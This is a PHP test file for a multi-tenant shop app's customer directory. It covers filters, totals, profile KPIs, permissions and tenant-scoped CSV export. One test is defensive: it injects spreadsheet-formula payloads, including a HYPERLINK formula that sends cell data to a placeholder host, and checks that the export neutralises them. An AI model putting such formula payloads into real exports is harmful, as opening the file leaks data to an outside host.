<?php

declare(strict_types=1);

use App\Enums\SaleStatus;
use App\Models\CustomerGroup;
use App\Support\Money\Money;
use App\Support\Permissions\SystemRoles;
use App\Support\Tenancy\TenantContext;
use Inertia\Testing\AssertableInertia as Assert;
use Tests\Fixtures\CustomerWorld;

/*
| The mockup directory and profile: list totals and filters, the dialog deep links, the profile KPI
| tiles and the CSV export (always the caller's tenant).
*/

it('totals the filtered list: count, balance and credit limit', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    CustomerWorld::make($tenant, ['name' => 'Owes', 'customer_no' => 10000017, 'balance' => Money::ofPaisa(120000), 'credit_limit' => Money::ofPaisa(1000000), 'area' => 'Kalai', 'address_line' => 'Holding 42', 'post_code' => '5930']);
    CustomerWorld::make($tenant, ['name' => 'Advance', 'customer_no' => 10000025, 'balance' => Money::ofPaisa(-5000), 'credit_limit' => Money::ofPaisa(500000)]);
    CustomerWorld::make($tenant, ['name' => 'Zero', 'customer_no' => 10000033]);
    [, $other] = CustomerWorld::actor();
    CustomerWorld::make($other, ['name' => 'Foreign', 'balance' => Money::ofPaisa(999999), 'credit_limit' => Money::ofPaisa(999999)]);

    $this->actingAs($user);
    $this->get('/app/customers?per_page=25')->assertOk()->assertInertia(
        fn (Assert $p) => $p->component('customers/index')->where('dialog', null)
            ->where('totals', ['count' => 3, 'balance' => 115000, 'credit_limit' => 1500000])
            ->where('customers.2.name', 'Zero')
            ->where('customers.1.credit_limit', 1000000)->where('customers.1.area', 'Kalai')
            ->where('customers.1.address_line', 'Holding 42')->where('customers.1.post_code', '5930'),
    );
    $this->get('/app/customers?filter[balance]=due')->assertInertia(fn (Assert $p) => $p->has('customers', 1)->where('totals.count', 1)->where('totals.balance', 120000));
    $this->get('/app/customers?filter[balance]=advance')->assertInertia(fn (Assert $p) => $p->has('customers', 1)->where('customers.0.name', 'Advance'));
    $this->get('/app/customers?filter[balance]=zero')->assertInertia(fn (Assert $p) => $p->has('customers', 1)->where('customers.0.name', 'Zero'));
    $this->get('/app/customers?filter[view]=overdue')->assertInertia(fn (Assert $p) => $p->has('customers', 1)->where('customers.0.name', 'Owes'));
});

it('falls back to the tenant default credit limit in rows and totals', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    $tenant->forceFill(['settings' => [...$tenant->settings, 'default_credit_limit' => 2000000]])->save();
    CustomerWorld::make($tenant, ['name' => 'Own limit', 'credit_limit' => Money::ofPaisa(500000)]);
    CustomerWorld::make($tenant, ['name' => 'Default limit']);

    $this->actingAs($user)->get('/app/customers')->assertInertia(
        fn (Assert $p) => $p->where('customers.0.name', 'Default limit')->where('customers.0.credit_limit', 2000000)
            ->where('customers.1.credit_limit', 500000)->where('totals.credit_limit', 2500000),
    );
});

it('filters by view inactive and by last purchase date preset', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    CustomerWorld::make($tenant, ['name' => 'Recent', 'last_purchase_at' => now()->subDays(3)]);
    CustomerWorld::make($tenant, ['name' => 'Old', 'last_purchase_at' => now()->subDays(60)]);
    CustomerWorld::make($tenant, ['name' => 'Gone', 'is_active' => false]);

    $this->actingAs($user);
    $this->get('/app/customers?filter[date]=7d')->assertInertia(fn (Assert $p) => $p->has('customers', 1)->where('customers.0.name', 'Recent'));
    $this->get('/app/customers?filter[date]=90d')->assertInertia(fn (Assert $p) => $p->has('customers', 2));
    $this->get('/app/customers?filter[date]=bogus')->assertInertia(fn (Assert $p) => $p->has('customers', 2));
    $this->get('/app/customers?filter[view]=inactive')->assertInertia(fn (Assert $p) => $p->has('customers', 1)->where('customers.0.name', 'Gone'));
});

it('opens the add dialog on the list and the edit dialog on the profile as deep links', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    $group = app(TenantContext::class)->withoutTenancy(fn () => CustomerGroup::factory()->for($tenant)->create(['name' => 'VIP', 'discount_bp' => 1000]));
    $customer = CustomerWorld::make($tenant, ['name' => 'Editable', 'customer_no' => 10000017, 'customer_group_id' => $group->id]);

    $this->actingAs($user);
    $this->get('/app/customers/create')->assertOk()->assertInertia(
        fn (Assert $p) => $p->component('customers/index')->where('dialog', 'create')->has('customers', 1)->has('totals')
            ->where('groups.0', ['id' => $group->id, 'name' => 'VIP', 'discount_bp' => 1000]),
    );
    $this->get("/app/customers/{$customer->uuid}/edit")->assertOk()->assertInertia(
        fn (Assert $p) => $p->component('customers/show')->where('editing', true)->where('customer.uuid', $customer->uuid)
            ->where('customer.group_discount_bp', 1000)->has('groups', 1)->has('kpis'),
    );
    $this->get("/app/customers/{$customer->uuid}")->assertInertia(fn (Assert $p) => $p->where('editing', false));
});

it('computes the profile KPIs from completed sales, returns, balance and the credit limit', function (): void {
    [$user, $tenant, $branch] = CustomerWorld::actor();
    $customer = CustomerWorld::make($tenant, ['name' => 'Buyer', 'customer_no' => 10000017, 'balance' => Money::ofPaisa(300000), 'credit_limit' => Money::ofPaisa(1000000)]);
    $other = CustomerWorld::make($tenant, ['name' => 'Someone else']);
    CustomerWorld::sale($tenant, $branch, $customer, ['number' => 'S-1', 'total' => Money::ofPaisa(500000), 'sold_at' => now()->subDays(2)]);
    CustomerWorld::sale($tenant, $branch, $customer, ['number' => 'S-2', 'total' => Money::ofPaisa(250000), 'sold_at' => now()->subDay()]);
    CustomerWorld::sale($tenant, $branch, $customer, ['number' => 'S-3', 'total' => Money::ofPaisa(90000), 'status' => SaleStatus::Voided]);
    CustomerWorld::sale($tenant, $branch, $other, ['number' => 'S-4', 'total' => Money::ofPaisa(70000)]);

    $this->actingAs($user)->get("/app/customers/{$customer->uuid}")->assertOk()->assertInertia(
        fn (Assert $p) => $p->where('kpis.lifetime_spend', 750000)->where('kpis.visits', 2)->where('kpis.returns', 0)
            ->where('kpis.due', 300000)->where('kpis.credit_limit', 1000000)->where('kpis.credit_used', 300000)
            ->where('kpis.credit_available', 700000)->whereType('kpis.last_visit_at', 'string')->where('can.sms', true),
    );
});

it('reports zero KPIs for a new customer and an advance as no credit used', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    $customer = CustomerWorld::make($tenant, ['name' => 'Fresh', 'balance' => Money::ofPaisa(-2000), 'credit_limit' => null]);

    $this->actingAs($user)->get("/app/customers/{$customer->uuid}")->assertInertia(
        fn (Assert $p) => $p->where('kpis.lifetime_spend', 0)->where('kpis.visits', 0)->where('kpis.last_visit_at', null)
            ->where('kpis.due', -2000)->where('kpis.credit_used', 0),
    );
});

it('exports the filtered customers of the current tenant as CSV', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    CustomerWorld::make($tenant, ['name' => 'Rahim', 'name_bn' => 'রহিম', 'shop_name' => 'Moon Store', 'customer_no' => 10000017, 'phone' => '+8801711111111', 'balance' => Money::ofPaisa(120050), 'credit_limit' => Money::ofPaisa(1000000)]);
    CustomerWorld::make($tenant, ['name' => 'Karim', 'customer_no' => 10000025]);
    CustomerWorld::make($tenant, ['name' => 'Walk-in', 'is_walk_in' => true]);
    [, $other] = CustomerWorld::actor();
    CustomerWorld::make($other, ['name' => 'Foreign Person']);

    $this->actingAs($user);
    $response = $this->get('/app/customers/export.csv')->assertOk();
    expect($response->headers->get('content-type'))->toContain('text/csv');
    $csv = $response->streamedContent();
    expect($csv)->toStartWith("\xEF\xBB\xBF")->toContain('"Customer No",Name,"Name BN",Shop,Phone')
        ->toContain('"1000 0017",Rahim,রহিম,"Moon Store",+8801711111111')->toContain('1200.50,10000.00')
        ->toContain('Karim')->not->toContain('Walk-in')->not->toContain('Foreign Person')->not->toContain('pin');

    $due = $this->get('/app/customers/export.csv?filter[balance]=due')->streamedContent();
    expect($due)->toContain('Rahim')->not->toContain('Karim');
});

it('neutralises spreadsheet formulas in the customer CSV but keeps numbers and phones', function (): void {
    [$user, $tenant] = CustomerWorld::actor();
    CustomerWorld::make($tenant, ['name' => '=HYPERLINK("http://x/?"&A1,"click")', 'shop_name' => '@SUM(A1)', 'area' => '+cmd', 'address_line' => '-2+3', 'phone' => '+8801711111111', 'balance' => Money::ofPaisa(-5000)]);

    $csv = $this->actingAs($user)->get('/app/customers/export.csv')->streamedContent();
    expect($csv)->toContain('"\'=HYPERLINK(""http://x/?""&A1,""click"")"')
        ->toContain(",'@SUM(A1),+8801711111111,,,'+cmd,'-2+3,")
        ->toContain(',-50.00,')
        ->not->toContain(',=HYPERLINK');
});

it('keeps the export and the deep links behind their permissions', function (): void {
    [$keeper, $tenant] = CustomerWorld::actor(SystemRoles::STOCK_KEEPER);
    $customer = CustomerWorld::make($tenant, ['name' => 'Hidden']);

    $this->actingAs($keeper);
    $this->get('/app/customers/export.csv')->assertForbidden();
    $this->get('/app/customers/create')->assertForbidden();
    $this->get("/app/customers/{$customer->uuid}/edit")->assertForbidden();
    $this->get('/app/customers/export.csv')->assertForbidden();

    $this->post('/logout');
    $this->get('/app/customers/export.csv')->assertRedirect(route('login'));
});
